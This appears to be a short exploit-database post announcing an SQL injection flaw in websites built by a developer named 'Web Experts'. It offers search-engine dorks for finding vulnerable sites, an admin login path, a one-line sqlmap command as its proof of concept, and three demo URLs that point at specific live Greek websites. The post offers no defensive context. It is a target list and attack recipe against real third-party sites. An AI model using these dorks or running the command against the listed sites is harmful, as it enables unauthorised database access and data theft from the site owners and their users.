# Exploit Title:Designed and Developed by Web Experts SQL Injection
# Date:02.06.2019
# Dork1:intext:Designed and Developed by Web Experts inurl:english/article.php?id=
# Dork2:inurl:english/article.php?id= 
# Tested on:Windows

Reverse check bing.com

# Admin control panel path

site.com/administration/login.php

# Poc:
sqlmap.py –u “URL” --batch

#Demo
https://fgm.com.gr/english/article.php?id=31
 

https://www.dancearchive.gr/english/article.php?id=6
 


https://sotiriadelli.gr/article.php?id=8
 
